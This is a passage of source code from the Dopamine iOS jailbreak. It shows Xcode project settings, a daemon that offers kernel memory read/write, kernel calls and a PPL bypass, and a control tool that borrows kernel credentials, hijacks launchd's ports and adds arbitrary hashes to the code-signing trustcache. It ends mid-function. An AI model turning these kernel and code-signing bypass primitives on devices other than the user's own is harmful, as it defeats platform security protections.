			isa = PBXGroup;
			children = (
				8CE664662B61E36200D7895C /* libjailbreak.dylib */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		8C69A2212A320BBE007E401C /* idownloadd */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C69A2292A320BBE007E401C /* Build configuration list for PBXNativeTarget "idownloadd" */;
			buildPhases = (
				8C69A21E2A320BBE007E401C /* Sources */,
				8C69A21F2A320BBE007E401C /* Frameworks */,
				8C69A2202A320BBE007E401C /* CopyFiles */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = idownloadd;
			packageProductDependencies = (
				8C69A22D2A320CCC007E401C /* iDownload */,
			);
			productName = idownloadd;
			productReference = 8C69A2222A320BBE007E401C /* idownloadd */;
			productType = "com.apple.product-type.tool";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		8C69A21A2A320BBE007E401C /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1430;
				LastUpgradeCheck = 1430;
				TargetAttributes = {
					8C69A2212A320BBE007E401C = {
						CreatedOnToolsVersion = 14.3;
					};
				};
			};
			buildConfigurationList = 8C69A21D2A320BBE007E401C /* Build configuration list for PBXProject "idownloadd" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 8C69A2192A320BBE007E401C;
			packageReferences = (
				8C69A22C2A320CCC007E401C /* XCRemoteSwiftPackageReference "iDownload" */,
			);
			productRefGroup = 8C69A2232A320BBE007E401C /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				8C69A2212A320BBE007E401C /* idownloadd */,
			);
		};
/* End PBXProject section */

/* Begin PBXSourcesBuildPhase section */
		8C69A21E2A320BBE007E401C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8CE664652B61DF0200D7895C /* shim.c in Sources */,
				8C69A2302A320E71007E401C /* iDownloadKRW.swift in Sources */,
				8C69A2262A320BBE007E401C /* main.swift in Sources */,
				8C69A23F2A32239B007E401C /* iDownloadCmds.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		8C69A2272A320BBE007E401C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				MACOSX_DEPLOYMENT_TARGET = 13.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = macosx;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		8C69A2282A320BBE007E401C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				MACOSX_DEPLOYMENT_TARGET = 13.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = macosx;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
			};
			name = Release;
		};
		8C69A22A2A320BBE007E401C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_IDENTITY = "";
				CODE_SIGN_STYLE = Manual;
				DEVELOPMENT_TEAM = "";
				ENABLE_HARDENED_RUNTIME = YES;
				HEADER_SEARCH_PATHS = "$(SRCROOT)/../../.include";
				LIBRARY_SEARCH_PATHS = "$(SRCROOT)/../../.build";
				MACOSX_DEPLOYMENT_TARGET = 15.0;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = iphoneos;
				SUPPORTED_PLATFORMS = "iphonesimulator iphoneos";
				SWIFT_OBJC_BRIDGING_HEADER = "idownloadd/idownloadd-Bridging-Header.h";
				SWIFT_VERSION = 5.0;
			};
			name = Debug;
		};
		8C69A22B2A320BBE007E401C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_IDENTITY = "";
				CODE_SIGN_STYLE = Manual;
				DEVELOPMENT_TEAM = "";
				ENABLE_HARDENED_RUNTIME = YES;
				HEADER_SEARCH_PATHS = "$(SRCROOT)/../../.include";
				LIBRARY_SEARCH_PATHS = "$(SRCROOT)/../../.build";
				MACOSX_DEPLOYMENT_TARGET = 15.0;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = iphoneos;
				SUPPORTED_PLATFORMS = "iphonesimulator iphoneos";
				SWIFT_OBJC_BRIDGING_HEADER = "idownloadd/idownloadd-Bridging-Header.h";
				SWIFT_VERSION = 5.0;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		8C69A21D2A320BBE007E401C /* Build configuration list for PBXProject "idownloadd" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C69A2272A320BBE007E401C /* Debug */,
				8C69A2282A320BBE007E401C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C69A2292A320BBE007E401C /* Build configuration list for PBXNativeTarget "idownloadd" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C69A22A2A320BBE007E401C /* Debug */,
				8C69A22B2A320BBE007E401C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		8C69A22C2A320CCC007E401C /* XCRemoteSwiftPackageReference "iDownload" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/pinauten/iDownload";
			requirement = {
				branch = master;
				kind = branch;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		8C69A22D2A320CCC007E401C /* iDownload */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8C69A22C2A320CCC007E401C /* XCRemoteSwiftPackageReference "iDownload" */;
			productName = iDownload;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 8C69A21A2A320BBE007E401C /* Project object */;
}

```

`BaseBin/idownloadd/src/idownloadd.xcodeproj/project.xcworkspace/contents.xcworkspacedata`:

```xcworkspacedata
<?xml version="1.0" encoding="UTF-8"?>
<Workspace
   version = "1.0">
   <FileRef
      location = "self:">
   </FileRef>
</Workspace>

```

`BaseBin/idownloadd/src/idownloadd/iDownloadCmds.swift`:

```swift
//
//  iDownloadCMDs.swift
//  idownloadd
//
//  Created by Lars Fröder on 08.06.23.
//

import Foundation
import iDownload

let iDownloadCmds = [
    "help": iDownload_help
] as [String: iDownloadCmd]

func iDownload_help(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    try hndlr.sendline("")
}

```

`BaseBin/idownloadd/src/idownloadd/iDownloadKRW.swift`:

```swift
//
//  iDownloadKRW.swift
//  idownloadd
//
//  Created by Lars Fröder on 08.06.23.
//

import Foundation
import iDownload

public class iDownloadKRW: KRWHandler {
    public func getSupportedActions() -> KRWOptions {
        return [.virtRW, .physRW, .kalloc, .kcall, .PPLBypass]
    }
    
    public func getInfo() throws -> (kernelBase: UInt64, slide: UInt64) {
        return (kernelBase: c_getkbase(), slide: c_getkslide())
    }
    
    public func resolveAddress(forName: String) throws -> KRWAddress? {
        return nil
    }
    
    public func virtToPhys(address: UInt64) throws -> UInt64 {
        let phys = kvtophys(address);
        if (phys == 0) {
            throw KRWError.customError(description: "Address translation failure")
        }
        return phys;
    }
    
    public func kread(address: KRWAddress, size: UInt) throws -> Data {
        
        var phys = address.address
        if !address.options.contains(.physical) {
            do {
                phys = try virtToPhys(address: address.address)
            }
            catch {
                throw KRWError.readFailed
            }
        }
        
        let buffer = UnsafeMutableRawPointer.allocate(byteCount: Int(size), alignment: MemoryLayout<UInt8>.alignment)
        let result = physreadbuf(phys, buffer, Int(size))
        let outData = Data(bytes:buffer, count: Int(size))
        buffer.deallocate()
        if result != 0 {
            throw KRWError.readFailed
        }
        return outData
    }
    
    public func kwrite(address: KRWAddress, data: Data) throws {
        var phys = address.address
        if !address.options.contains(.physical) {
            do {
                phys = try virtToPhys(address: address.address)
            }
            catch {
                throw KRWError.writeFailed
            }
        }
        
        let result = data.withUnsafeBytes { bufferPointer in
            return physwritebuf(phys, bufferPointer.baseAddress, bufferPointer.count)
        }
        if result != 0 {
            throw KRWError.writeFailed
        }
    }
    
    public func kalloc(size: UInt) throws -> UInt64 {
        var kallocAddr: UInt64 = 0
        let r = c_kalloc(&kallocAddr, UInt64(size))
        if r != 0 {
            throw KRWError.customError(description: "kalloc_data_external failed to allocate!")
        }
        return kallocAddr
    }
    
    public func kfree(address: UInt64) throws {
        throw KRWError.notSupported
    }
    
    public func kcall(func: KRWAddress, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64) throws -> UInt64 {
        guard c_kcall_supported() else {
            throw KRWError.customError(description: "Kcall is not supported!")
        }
        
        guard !`func`.options.contains(.physical) else {
            // Nope, can't do that without disabling MMU (hardware prevents that)
            throw KRWError.customError(description: "Physical kcall not supported!")
        }
        
        guard !`func`.options.contains(.PPL) else {
            // Support could be added by e.g. making the PPL stack kernel writeable
            // and then triggering an exception in PPL, making sure a fault handler
            // is set that jumps to e.g. x22
            // The kernel will then update the PPL register state on the stack and return to PPL
            // which will then jump to x22
            throw KRWError.customError(description: "PPL kcall not supported!")
        }
        
        var data = Data(fromObject: a1)
        data.appendGeneric(value: a2)
        data.appendGeneric(value: a3)
        data.appendGeneric(value: a4)
        data.appendGeneric(value: a5)
        data.appendGeneric(value: a6)
        data.appendGeneric(value: a7)
        data.appendGeneric(value: a8)
        
        var result: UInt64 = 0
        
        return try data.withUnsafeBytes { (p: UnsafePointer<UInt64>) in
            let r = c_kcall(&result, `func`.address, 8, p)
            if r != 0 {
                throw KRWError.customError(description: "Kcall did not succeed!")
            }
            return result
        }
    }
}

```

`BaseBin/idownloadd/src/idownloadd/idownloadd-Bridging-Header.h`:

```h
//
//  idownloadd-Bridging-Header.h
//  idownloadd
//
//  Created by Lars Fröder on 08.06.23.
//

#ifndef idownloadd_Bridging_Header_h
#define idownloadd_Bridging_Header_h

#import <libjailbreak/libjailbreak.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/jbclient_xpc.h>

uint64_t c_getkslide(void);
uint64_t c_getkbase(void);
bool c_kcall_supported(void);
int c_kcall(uint64_t *result, uint64_t func, int argc, const uint64_t *argv);
uint64_t c_kalloc(uint64_t *addr, uint64_t size);

#endif /* idownloadd_Bridging_Header_h */

```

`BaseBin/idownloadd/src/idownloadd/main.swift`:

```swift
//
//  main.swift
//  idownloadd
//
//  Created by Lars Fröder on 08.06.23.
//

import Foundation
import iDownload

jbclient_initialize_primitives()

do {
    try iDownload.launch_iDownload(krw: iDownloadKRW(), otherCmds: iDownloadCmds)
} catch let e {
    NSLog("Failed to launch iDownload: \(e)")
    exit(1)
}

RunLoop.main.run()

```

`BaseBin/idownloadd/src/idownloadd/shim.c`:

```c
//
//  shim.c
//  idownloadd
//
//  Created by Lars Fröder on 25.01.24.
//

#include <stdio.h>
#include "idownloadd-Bridging-Header.h"

uint64_t c_getkslide(void)
{
    return kconstant(slide);
}

uint64_t c_getkbase(void)
{
    return kconstant(base);
}

bool c_kcall_supported(void)
{
    return is_kcall_available();
}

int c_kcall(uint64_t *result, uint64_t func, int argc, const uint64_t *argv)
{
    return kcall(result, func, argc, argv);
}

uint64_t c_kalloc(uint64_t *addr, uint64_t size)
{
    return kalloc(addr, size);
}

```

`BaseBin/jbctl/Makefile`:

```
TARGET = jbctl

CC = clang

CFLAGS = -framework Foundation -framework CoreServices -framework Security -I../.include -I./src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -Wno-availability -miphoneos-version-min=15.0 -fobjc-arc
LDFLAGS = -L../.build -ljailbreak -lchoma

sign: $(TARGET)
	@ldid -Sentitlements.plist $<

$(TARGET): $(wildcard src/*.m)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)
```

`BaseBin/jbctl/entitlements.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>platform-application</key>
	<true/>
	<key>task_for_pid-allow</key>
	<true/>
	<key>com.apple.system-task-ports</key>
	<true/>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>com.apple.security.exception.mach-lookup.global-name</key>
	<array>
		<string>com.opa334.jailbreakd</string>
	</array>
	<key>com.apple.private.xpc.launchd.userspace-reboot</key>
	<true/>
	<key>com.apple.private.bindfs-allow</key>
	<true/>
	<key>com.apple.private.iowatchdog.user-access</key>
	<true/>
	<key>com.apple.springboard.CFUserNotification</key>
	<true/>
</dict>
</plist>

```

`BaseBin/jbctl/src/internal.h`:

```h
int jbctl_handle_internal(const char *command, int argc, char* argv[]);
```

`BaseBin/jbctl/src/internal.m`:

```m
#import "internal.h"
#import <Foundation/Foundation.h>
#import <libjailbreak/libjailbreak.h>
#import <sys/mount.h>

SInt32 CFUserNotificationDisplayAlert(CFTimeInterval timeout, CFOptionFlags flags, CFURLRef iconURL, CFURLRef soundURL, CFURLRef localizationURL, CFStringRef alertHeader, CFStringRef alertMessage, CFStringRef defaultButtonTitle, CFStringRef alternateButtonTitle, CFStringRef otherButtonTitle, CFOptionFlags *responseFlags) API_AVAILABLE(ios(3.0));

void execute_unsandboxed(void (^block)(void))
{
	uint64_t credBackup = 0;
	jbclient_root_steal_ucred(0, &credBackup);
	block();
	jbclient_root_steal_ucred(credBackup, NULL);
}

int mount_unsandboxed(const char *type, const char *dir, int flags, void *data)
{
	__block int r = 0;
	execute_unsandboxed(^{
		r = mount(type, dir, flags, data);
	});
	return r;
}

int unmount_unsandboxed(const char *dir, int flags)
{
	__block int r = 0;
	execute_unsandboxed(^{
		r = unmount(dir, flags);
	});
	return r;
}

bool is_protected(const char *path)
{
	struct statfs sb;
	statfs(path, &sb);
	return strcmp(path, sb.f_mntonname) == 0;
}

int ensure_protected(const char *path)
{
	if (!is_protected(path)) {
		return mount_unsandboxed("bindfs", path, 0, (void *)path);
	}
	return 0;
}

int ensure_unprotected(const char *path)
{
	if (is_protected(path)) {
		return unmount_unsandboxed(path, MNT_FORCE);
	}
	return 0;
}

int protection_set_active(bool active)
{
	int r = 0;
	if (active) {
		// Protect /private/preboot/UUID/<System, usr> from being modified by bind mounting them on top of themselves
		// This protects dumb users from accidentally deleting these, which would induce a recovery loop after rebooting
		r |= ensure_protected(prebootUUIDPath("/System"));
		r |= ensure_protected(prebootUUIDPath("/usr"));
	}
	else {
		r |= ensure_unprotected(prebootUUIDPath("/System"));
		r |= ensure_unprotected(prebootUUIDPath("/usr"));
	}
	return r;
}

bool fakelib_is_mounted(void)
{
	struct statfs fsb;
    if (statfs("/usr/lib", &fsb) != 0) return NO;
    return strcmp(fsb.f_mntonname, "/usr/lib") == 0;
}

int fakelib_set_mounted(bool mounted)
{
	int r = 0;
	if (mounted != fakelib_is_mounted()) {
		if (mounted) {
			r = mount_unsandboxed("bindfs", "/usr/lib", MNT_RDONLY, (void *)JBROOT_PATH("/basebin/.fakelib"));
		}
		else {
			r = unmount_unsandboxed("/usr/lib", MNT_FORCE);
		}
	}
	return r;
}

int jbctl_handle_internal(const char *command, int argc, char* argv[])
{
	if (!strcmp(command, "launchd_stash_port")) {
		mach_port_t *selfInitPorts = NULL;
		mach_msg_type_number_t selfInitPortsCount = 0;
		if (mach_ports_lookup(mach_task_self(), &selfInitPorts, &selfInitPortsCount) != 0) {
			printf("ERROR: Failed port lookup on self\n");
			return -1;
		}
		if (selfInitPortsCount < 3) {
			printf("ERROR: Unexpected initports count on self\n");
			return -1;
		}
		if (selfInitPorts[2] == MACH_PORT_NULL) {
			printf("ERROR: Port to stash not set\n");
			return -1;
		}

		printf("Port to stash: %u\n", selfInitPorts[2]);

		mach_port_t launchdTaskPort;
		if (task_for_pid(mach_task_self(), 1, &launchdTaskPort) != 0) {
			printf("task_for_pid on launchd failed\n");
			return -1;
		}
		mach_port_t *launchdInitPorts = NULL;
		mach_msg_type_number_t launchdInitPortsCount = 0;
		if (mach_ports_lookup(launchdTaskPort, &launchdInitPorts, &launchdInitPortsCount) != 0) {
			printf("mach_ports_lookup on launchd failed\n");
			return -1;
		}
		if (launchdInitPortsCount < 3) {
			printf("ERROR: Unexpected initports count on launchd\n");
			return -1;
		}
		launchdInitPorts[2] = selfInitPorts[2]; // Transfer port to launchd
		if (mach_ports_register(launchdTaskPort, launchdInitPorts, launchdInitPortsCount) != 0) {
			printf("ERROR: Failed stashing port into launchd\n");
			return -1;
		}
		mach_port_deallocate(mach_task_self(), launchdTaskPort);
		return 0;
	}
	else if (!strcmp(command, "protection")) {
		bool toSet = false;
		if (argc > 1) {
			if (!strcmp(argv[1], "activate")) {
				toSet = true;
			}
			else if (!strcmp(argv[1], "deactivate")) {
				toSet = false;
			}
			else {
				return -1;
			}

			return protection_set_active(toSet);
		}
		return -1;
	}
	else if (!strcmp(command, "fakelib")) {
		bool toMount = false;
		if (argc > 1) {
			if (!strcmp(argv[1], "mount")) {
				toMount = true;
			}
			else if (!strcmp(argv[1], "unmount")) {
				toMount = false;
			}
			else {
				return -1;
			}

			return fakelib_set_mounted(toMount);
		}
		return -1;
	}
	else if (!strcmp(command, "startup")) {
		protection_set_active(true);
		char *panicMessage = NULL;
		if (jbclient_watchdog_get_last_userspace_panic(&panicMessage) == 0) {
			NSString *printMessage = [NSString stringWithFormat:@"Dopamine has protected you from a userspace panic by temporarily disabling tweak injection and triggering a userspace reboot instead. A log is available under Analytics in the Preferences app. You can reenable tweak injection in the Dopamine app.\n\nPanic message: \n%s", panicMessage];
			CFUserNotificationDisplayAlert(0, 2/*kCFUserNotificationCautionAlertLevel*/, NULL, NULL, NULL, CFSTR("Watchdog Timeout"), (__bridge CFStringRef)printMessage, NULL, NULL, NULL, NULL);
			free(panicMessage);
		}
		exec_cmd(JBROOT_PATH("/usr/bin/uicache"), "-a", NULL);
	}
	else if (!strcmp(command, "install_pkg")) {
		if (argc > 1) {
			extern char **environ;
			const char *dpkg = JBROOT_PATH("/usr/bin/dpkg");
			int r = execve(dpkg, (char *const *)(const char *[]){dpkg, "-i", argv[1], NULL}, environ);
			return r;
		}
		return -1;
	}
	return -1;
}

```

`BaseBin/jbctl/src/main.m`:

```m
#import <libjailbreak/libjailbreak.h>
#import <libjailbreak/jbclient_xpc.h>
#import <libjailbreak/jbclient_mach.h>
#import "internal.h"

#import <Foundation/Foundation.h>
#import <CoreServices/LSApplicationProxy.h>

int reboot3(uint64_t flags, ...);
#define RB2_USERREBOOT (0x2000000000000000llu)
extern char **environ;

void print_usage(void)
{
	printf("Usage: jbctl <command> <arguments>\n\
Available commands:\n\
	proc_set_debugged <pid>\t\tMarks the process with the given pid as being debugged, allowing invalid code pages inside of it\n\
	trustcache info\t\t\tPrint info about all jailbreak related trustcaches and the cdhashes contained in them\n\
	trustcache clear\t\tClears all existing cdhashes from the jailbreaks trustcache\n\
	trustcache add <cdhash>\t\tAdd an arbitrary cdhash to the jailbreaks trustcache\n\
	update <tipa/basebin> <path>\tInitiates a jailbreak update either based on a TIPA or based on a basebin.tar file, TIPA installation depends on TrollStore, afterwards it triggers a userspace reboot\n");
}

int main(int argc, char* argv[])
{
	if (!strcmp(argv[argc-1], "earlyboot")) {
		// If jbctl is spawned in "early boot" state, the jbserver port needs to be obtained from registeredPorts[0] instead
		mach_port_t *registeredPorts;
		mach_msg_type_number_t registeredPortsCount = 0;
		if (mach_ports_lookup(mach_task_self(), &registeredPorts, &registeredPortsCount) == KERN_SUCCESS) {
			jbclient_xpc_set_custom_port(registeredPorts[0]);

			for(mach_msg_type_number_t i = 1; i < registeredPortsCount; i++) {
				mach_port_deallocate(mach_task_self(), registeredPorts[i]);
			}
			vm_deallocate(mach_task_self(), (vm_address_t)registeredPorts, registeredPortsCount * sizeof(mach_port_t));
		}
	}

	setvbuf(stdout, NULL, _IOLBF, 0);
	if (argc < 2) {
		print_usage();
		return 1;
	}

	if (getuid() != 0 && geteuid() == 0) {
		// When jailbroken the Dopamine app cannot have uid 0 because it can't drop it anymore without loosing it
		// So in some cases (e.g. for spawning dpkg) we need to use jbctl to get it
		setuid(0);
	}

	const char *rootPath = jbclient_get_jbroot();
	if (rootPath) {
		gSystemInfo.jailbreakInfo.rootPath = strdup(rootPath);
	}

	char *cmd = argv[1];
	if (!strcmp(cmd, "proc_set_debugged")) {
		if (argc != 3) {
			print_usage();
			return 1;
		}
		int pid = atoi(argv[2]);
		int64_t result = jbclient_platform_set_process_debugged(pid, true);
		if (result == 0) {
			printf("Successfully marked proc of pid %d as debugged\n", pid);
		}
		else {
			printf("Failed to mark proc of pid %d as debugged\n", pid);
		}
	}
	else if (!strcmp(cmd, "trustcache")) {
		if (argc < 3) {
			print_usage();
			return 2;
		}
		if (getuid() != 0) {
			printf("ERROR: trustcache subcommand requires root.\n");
			return 3;
		}
		const char *trustcacheCmd = argv[2];
		if (!strcmp(trustcacheCmd, "info")) {
			xpc_object_t tcArr = nil;
			if (jbclient_root_trustcache_info(&tcArr) == 0) {
				size_t tcCount = xpc_array_get_count(tcArr);
				for (size_t i = 0; i < tcCount; i++) {
					xpc_object_t tc = xpc_array_get_dictionary(tcArr, i);
					size_t uuidLength = 0;
					const void *uuidData = xpc_dictionary_get_data(tc, "uuid", &uuidLength);
					xpc_object_t cdhashesArr = xpc_dictionary_get_array(tc, "cdhashes");
					if (uuidData && cdhashesArr) {
						size_t length = xpc_array_get_count(cdhashesArr);
						char uuidString[uuidLength * 2 + 1];
						convert_data_to_hex_string(uuidData, uuidLength, uuidString);
						printf("Jailbreak Trustcache %zd <UUID: %s> (length: %zd)\n", i, uuidString, length);
						for (size_t j = 0; j < length; j++) {
							size_t cdhashLength = 0;
							const void *cdhashData = xpc_array_get_data(cdhashesArr, j, &cdhashLength);
							if (cdhashData) {
								char cdhashString[cdhashLength * 2 + 1];
								convert_data_to_hex_string(cdhashData, cdhashLength, cdhashString);
								printf("| %zd:\t%s\n", j+1, cdhashString);
							}
						}
					}
				}
			}
			return 0;
		}
		else if (!strcmp(trustcacheCmd, "clear")) {
			return jbclient_root_trustcache_clear();
		}
		else if (!strcmp(trustcacheCmd, "add")) {
			if (argc < 4) {
				print_usage();
				return 2;
			}
			const char *cdhashString = argv[3];
			if (strlen(cdhashString) != (sizeof(cdhash_t) * 2)) {
				printf("ERROR: passed cdhash has wrong length\n");
				return 2;
			}
			cdhash_t cdhash;
			if (convert_hex_string_to_data(cdhashString, &cdhash)) {
				printf("ERROR: passed cdhash is malformed\n");
				return 2;
			}
			return jbclient_root_trustcache_add_cdhash(cdhash, sizeof(cdhash));
		}
	}
	else if (!strcmp(cmd, "reboot_userspace")) {
		return reboot3(RB2_USERREBOOT);
	}
	else if (!strcmp(cmd, "update")) {
		if (argc < 4) {
			print_usage();
			return 2;
		}
		char *updateType = argv[2];
		char *updateFile = argv[3];
		if (access(updateFile, F_OK) != 0) {
			printf("ERROR: File %s does not exist\n", updateFile);
			return 3;
		}

		if (!strcmp(updateType, "tipa")) {
			setsid();

			LSApplicationProxy *trollstoreAppProxy = [LSApplicationProxy applicationProxyForIdentifier:@"com.opa334.TrollStore"];
			if (!trollstoreAppProxy || !trollstoreAppProxy.installed) {
				printf("Unable to locate TrollStore, doesn't seem like it's installed.\n");
				return 4;
			}
			NSString *trollstorehelperPath = [trollstoreAppProxy.bundleURL.path stringByAppendingPathComponent:@"trollstorehelper"];
			int r = exec_cmd(trollstorehelperPath.fileSystemRepresentation, "install", "skip-uicache", "force", updateFile, NULL);
			if (r != 0) {
				printf("Failed to install tipa via TrollStore: %d\n", r);
				return 5;
			}

			LSApplicationProxy *dopamineAppProxy = [LSApplicationProxy applicationProxyForIdentifier:@"com.opa334.Dopamine"];
			if (!dopamineAppProxy) {
				printf("Unable to locate newly installed Dopamine build.\n");
				return 6;
			}
			updateFile = strdup([dopamineAppProxy.bundleURL.path stringByAppendingPathComponent:@"basebin.tar"].fileSystemRepresentation);
			// Fall through to basebin installation
		}
		else if (strcmp(updateType, "basebin") != 0) {
			// If type is neither tipa nor basebin, bail out
			print_usage();
			return 2;
		}

